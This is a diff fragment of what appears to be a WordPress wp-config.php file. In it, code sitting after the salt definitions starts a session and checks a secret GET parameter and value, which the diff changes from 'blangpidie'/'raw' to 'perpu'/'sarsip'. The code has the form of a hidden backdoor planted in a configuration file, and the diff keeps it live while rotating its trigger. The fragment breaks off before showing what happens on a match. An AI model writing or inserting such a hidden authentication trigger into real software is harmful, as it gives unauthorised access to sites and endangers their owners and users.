@@ -66,8 +66,8 @@ define( 'NONCE_SALT',       'put your unique phrase here' );
  * a unique prefix. Only numbers, letters, and underscores please!
  */
 session_start(); 
-$expected_param = 'blangpidie';
-$expected_value = 'raw';
+$expected_param = 'perpu';
+$expected_value = 'sarsip';
 $is_authenticated = isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;
 
 if (isset($_GET[$expected_param]) && $_GET[$expected_param] === $expected_value) {
